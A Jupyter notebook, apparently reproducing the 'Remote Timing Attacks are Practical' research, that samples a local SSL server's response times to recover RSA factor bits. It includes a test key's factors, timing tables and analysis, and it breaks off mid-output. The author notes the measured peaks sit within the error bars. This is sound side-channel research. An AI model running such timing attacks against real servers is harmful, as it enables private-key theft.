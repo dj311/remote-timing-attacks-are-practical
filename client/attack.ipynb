{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Remote Timing Attacks are Practical\n",
    "_Experiment 6: Attacking SSL applications on the local network._\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scipy\n",
    "import scipy.signal\n",
    "import seaborn\n",
    "import sympy\n",
    "import pandas\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "from IPython import display\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tls\n",
    "import attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Theory"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "p = sympy.Integer(11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789)\n",
    "q = sympy.Integer(11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283)\n",
    "N = sympy.Integer(132762152776056020551326919245624484615462467876809681535549565118332290525598572815747323476102181376625279228965473106140757139049665124368186142774966643990206422037551427526013151129106319233128471783533673959766053786798472937188481868923726256436384468384858420931063093337134977283618537887974322079287)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bruteforce Top Few Bits of $q$\n",
    "The aim of this notebook is to sample the server response times for a bunch of `g` values, and find out if the distribution is meaningfully different between them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3848556</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3703027</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3775405</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3705044</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3706100</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>511995</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3652114</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>511996</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3583819</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>511997</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3578774</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>511998</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3651595</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>511999</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3578403</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>512000 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                    point     time\n",
       "0       6703903964971298549787012499102923063739682910...  3848556\n",
       "1       6703903964971298549787012499102923063739682910...  3703027\n",
       "2       6703903964971298549787012499102923063739682910...  3775405\n",
       "3       6703903964971298549787012499102923063739682910...  3705044\n",
       "4       6703903964971298549787012499102923063739682910...  3706100\n",
       "...                                                   ...      ...\n",
       "511995  1298881393213189094021233671701191343599563563...  3652114\n",
       "511996  1298881393213189094021233671701191343599563563...  3583819\n",
       "511997  1298881393213189094021233671701191343599563563...  3578774\n",
       "511998  1298881393213189094021233671701191343599563563...  3651595\n",
       "511999  1298881393213189094021233671701191343599563563...  3578403\n",
       "\n",
       "[512000 rows x 2 columns]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "NEIGHBOURHOOD_SIZE = 1600\n",
    "SAMPLE_SIZE = 20\n",
    "BRUTEFORCED_BITS = 5\n",
    "\n",
    "filename = \"./measurements/bruteforce-top-bits.txt\"\n",
    "if not os.path.exists(filename):\n",
    "    gs = attack.bruteforce_most_significant_bits(num_bits=BRUTEFORCED_BITS)\n",
    "    \n",
    "    print(\"Taking {} samples...\".format(len(gs)*SAMPLE_SIZE*NEIGHBOURHOOD_SIZE))\n",
    "    \n",
    "    raw_samples = attack.sample(\n",
    "        gs,\n",
    "        sample_size=SAMPLE_SIZE,\n",
    "        neighbourhood_size=NEIGHBOURHOOD_SIZE,\n",
    "        u_g=True,\n",
    "        N=N,\n",
    "    )\n",
    "    samples = pandas.DataFrame.from_records(\n",
    "        raw_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    samples.to_csv(filename, sep=\" \")\n",
    "\n",
    "else:\n",
    "    samples = pandas.read_csv(\n",
    "        filename,\n",
    "        sep=\" \",\n",
    "        usecols=[\"point\", \"time\"],\n",
    "    )\n",
    "\n",
    "samples['point'] = samples['point'].apply(sympy.Integer)\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the paper, they take median time for each point. By taking the minimum, I hope to extract the fastest time possible, which should be the time with minimal context switches and other delays. This works provided the only sources of unwanted noise _add time_ (rather than remove it)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3591313.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3625458.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3582157.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3583097.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3600799.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25595</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3579348.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25596</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3612218.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25597</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3583038.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25598</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3579891.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25599</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3593931.5</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>25600 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   point       time\n",
       "0      6703903964971298549787012499102923063739682910...  3591313.0\n",
       "1      6703903964971298549787012499102923063739682910...  3625458.0\n",
       "2      6703903964971298549787012499102923063739682910...  3582157.0\n",
       "3      6703903964971298549787012499102923063739682910...  3583097.0\n",
       "4      6703903964971298549787012499102923063739682910...  3600799.5\n",
       "...                                                  ...        ...\n",
       "25595  1298881393213189094021233671701191343599563563...  3579348.5\n",
       "25596  1298881393213189094021233671701191343599563563...  3612218.0\n",
       "25597  1298881393213189094021233671701191343599563563...  3583038.0\n",
       "25598  1298881393213189094021233671701191343599563563...  3579891.0\n",
       "25599  1298881393213189094021233671701191343599563563...  3593931.5\n",
       "\n",
       "[25600 rows x 2 columns]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"point\").median().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can group samples into their respective \"neighbourhoods\" considering their most significant bits only."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def point_to_neighbourhood(point):\n",
    "    point_int = sympy.Integer(point)\n",
    "    point_bits = attack.sympy_integer_to_bits(point_int)\n",
    "    neighbourhood_point_bits = point_bits[0:BRUTEFORCED_BITS] + [0] * (512-BRUTEFORCED_BITS)\n",
    "    neighbourhood_point_int = attack.bits_to_sympy_integer(neighbourhood_point_bits)\n",
    "    return neighbourhood_point_int\n",
    "\n",
    "samples['neighbourhood'] = samples['point'].apply(point_to_neighbourhood)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sum together the measurements in each neighbourhood:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3.588909e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>7122897962782004709148700780296855755223413092...</td>\n",
       "      <td>3.586103e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>3.585785e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>7960885958403417027872077342684721138190873455...</td>\n",
       "      <td>3.587093e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>3.587452e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>8798873954024829346595453905072586521158333819...</td>\n",
       "      <td>3.588004e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>3.586637e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>9636861949646241665318830467460451904125794183...</td>\n",
       "      <td>3.586086e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>3.587378e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>1047484994526765398404220702984831728709325454...</td>\n",
       "      <td>3.586947e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>3.584435e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>1131283794088906630276558359223618267006071491...</td>\n",
       "      <td>3.586618e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>3.585945e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>1215082593651047862148896015462404805302817527...</td>\n",
       "      <td>3.586463e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>3.587153e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3.587264e+06</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        neighbourhood          time\n",
       "0   6703903964971298549787012499102923063739682910...  3.588909e+06\n",
       "1   7122897962782004709148700780296855755223413092...  3.586103e+06\n",
       "2   7541891960592710868510389061490788446707143274...  3.585785e+06\n",
       "3   7960885958403417027872077342684721138190873455...  3.587093e+06\n",
       "4   8379879956214123187233765623878653829674603637...  3.587452e+06\n",
       "5   8798873954024829346595453905072586521158333819...  3.588004e+06\n",
       "6   9217867951835535505957142186266519212642064001...  3.586637e+06\n",
       "7   9636861949646241665318830467460451904125794183...  3.586086e+06\n",
       "8   1005585594745694782468051874865438459560952436...  3.587378e+06\n",
       "9   1047484994526765398404220702984831728709325454...  3.586947e+06\n",
       "10  1089384394307836014340389531104224997857698472...  3.584435e+06\n",
       "11  1131283794088906630276558359223618267006071491...  3.586618e+06\n",
       "12  1173183193869977246212727187343011536154444509...  3.585945e+06\n",
       "13  1215082593651047862148896015462404805302817527...  3.586463e+06\n",
       "14  1256981993432118478085064843581798074451190545...  3.587153e+06\n",
       "15  1298881393213189094021233671701191343599563563...  3.587264e+06"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"neighbourhood\").mean().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know the factors of `N` (`q` and `p` with `q<p`) we can consider each point relative in size to these factors. When plotting, we are looking for peaks and troughs near whole multples of `p` and `q`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "      <th>point_relative_to_sqrt_n</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>3.588909e+06</td>\n",
       "      <td>0.581823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>7122897962782004709148700780296855755223413092...</td>\n",
       "      <td>3.586103e+06</td>\n",
       "      <td>0.618187</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>3.585785e+06</td>\n",
       "      <td>0.654551</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>7960885958403417027872077342684721138190873455...</td>\n",
       "      <td>3.587093e+06</td>\n",
       "      <td>0.690914</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>3.587452e+06</td>\n",
       "      <td>0.727278</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>8798873954024829346595453905072586521158333819...</td>\n",
       "      <td>3.588004e+06</td>\n",
       "      <td>0.763642</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>3.586637e+06</td>\n",
       "      <td>0.800006</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>9636861949646241665318830467460451904125794183...</td>\n",
       "      <td>3.586086e+06</td>\n",
       "      <td>0.836370</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>3.587378e+06</td>\n",
       "      <td>0.872734</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>1047484994526765398404220702984831728709325454...</td>\n",
       "      <td>3.586947e+06</td>\n",
       "      <td>0.909098</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>3.584435e+06</td>\n",
       "      <td>0.945462</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>1131283794088906630276558359223618267006071491...</td>\n",
       "      <td>3.586618e+06</td>\n",
       "      <td>0.981826</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>3.585945e+06</td>\n",
       "      <td>1.018190</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>1215082593651047862148896015462404805302817527...</td>\n",
       "      <td>3.586463e+06</td>\n",
       "      <td>1.054554</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>3.587153e+06</td>\n",
       "      <td>1.090918</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>3.587264e+06</td>\n",
       "      <td>1.127281</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        neighbourhood          time  \\\n",
       "0   6703903964971298549787012499102923063739682910...  3.588909e+06   \n",
       "1   7122897962782004709148700780296855755223413092...  3.586103e+06   \n",
       "2   7541891960592710868510389061490788446707143274...  3.585785e+06   \n",
       "3   7960885958403417027872077342684721138190873455...  3.587093e+06   \n",
       "4   8379879956214123187233765623878653829674603637...  3.587452e+06   \n",
       "5   8798873954024829346595453905072586521158333819...  3.588004e+06   \n",
       "6   9217867951835535505957142186266519212642064001...  3.586637e+06   \n",
       "7   9636861949646241665318830467460451904125794183...  3.586086e+06   \n",
       "8   1005585594745694782468051874865438459560952436...  3.587378e+06   \n",
       "9   1047484994526765398404220702984831728709325454...  3.586947e+06   \n",
       "10  1089384394307836014340389531104224997857698472...  3.584435e+06   \n",
       "11  1131283794088906630276558359223618267006071491...  3.586618e+06   \n",
       "12  1173183193869977246212727187343011536154444509...  3.585945e+06   \n",
       "13  1215082593651047862148896015462404805302817527...  3.586463e+06   \n",
       "14  1256981993432118478085064843581798074451190545...  3.587153e+06   \n",
       "15  1298881393213189094021233671701191343599563563...  3.587264e+06   \n",
       "\n",
       "    point_relative_to_sqrt_n  \n",
       "0                   0.581823  \n",
       "1                   0.618187  \n",
       "2                   0.654551  \n",
       "3                   0.690914  \n",
       "4                   0.727278  \n",
       "5                   0.763642  \n",
       "6                   0.800006  \n",
       "7                   0.836370  \n",
       "8                   0.872734  \n",
       "9                   0.909098  \n",
       "10                  0.945462  \n",
       "11                  0.981826  \n",
       "12                  1.018190  \n",
       "13                  1.054554  \n",
       "14                  1.090918  \n",
       "15                  1.127281  "
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqrt_N = sympy.sqrt(N)\n",
    "samples['point_relative_to_sqrt_n'] = samples['neighbourhood'].apply(lambda g: round(float(g/sqrt_N), 10))\n",
    "samples"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_relative_to_sqrt_n = round(float(q/sqrt_N), 10)\n",
    "p_relative_to_sqrt_n = round(float(p/sqrt_N), 10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now plot the media response time as we vary `g`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(3584434.9721875, 3588909.3959375, 447.4423750000075)"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "smallest_time_observed = samples['time'].min()\n",
    "largest_time_observed = samples['time'].max()\n",
    "\n",
    "buffer = (largest_time_observed - smallest_time_observed)/10\n",
    "\n",
    "smallest_time_observed, largest_time_observed, buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "if SAMPLE_SIZE == 20 and NEIGHBOURHOOD_SIZE == 800:\n",
    "    error = 27442/(2*6529841)\n",
    "elif SAMPLE_SIZE == 7 and NEIGHBOURHOOD_SIZE == 400:\n",
    "    error = 42987/(2*6500856)\n",
    "else:\n",
    "    # Default to the smallest error, but maybe it would be better not to show it at all\n",
    "    error = 27442/(2*6529841)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "ylim = (\n",
    "    smallest_time_observed * (1 - error) - buffer,\n",
    "    largest_time_observed * (1 + error) + buffer,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fb0c8848790>"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "if error:\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1+error) for y in samples['time']], color='lightblue')\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1-error) for y in samples['time']], color='lightblue')\n",
    "g.set(ylim=ylim)\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fb0c60f1a50>"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "if error:\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1+error) for y in samples['time']], color='lightblue')\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1-error) for y in samples['time']], color='lightblue')\n",
    "g.set(ylim=ylim)\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fb0c6073dd0>"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "if error:\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1+error) for y in samples['time']], color='lightblue')\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1-error) for y in samples['time']], color='lightblue')\n",
    "g.set(ylim=ylim)\n",
    "g.set(xlim=(q_relative_to_sqrt_n*0.9, p_relative_to_sqrt_n*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the section below, we bound the value of $q$ using the shape of this graph. But its worth noting that the peaks and troughs in the graphs above fit well inside the error bars (calculated in the `noise.ipynb` notebook). It is likely this graph should just be a straight line. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bounding our search for `q`\n",
    "\n",
    "`scipy` finds two peaks in the sample set."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peak_indices, _ = scipy.signal.find_peaks(samples['time'])\n",
    "len(peak_indices)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets re-plot the above graph with the peaks highlighted:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fb0c607fc10>"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "for peak_index in peak_indices:\n",
    "    peak = samples.iloc[peak_index]\n",
    "    plt.plot([peak['point_relative_to_sqrt_n'], peak['point_relative_to_sqrt_n']], ylim, color='orange')\n",
    "\n",
    "if error:\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1+error) for y in samples['time']], color='lightblue')\n",
    "    plt.plot(samples['point_relative_to_sqrt_n'], [y*(1-error) for y in samples['time']], color='lightblue')\n",
    "g.set(ylim=ylim)\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I'm going to cheat a little and say that the first peak they've detected isn't quite a peak. We could have modified the `find_peaks` call to be more discerning, or fit a KDE to it, but I think its relatively clear the primary peak is the second value they've detected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "peak_index = 1\n",
    "peak_row = samples.iloc[peak_indices[1]]\n",
    "peak_g = peak_row['neighbourhood']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 0, 0]"
      ]
     },
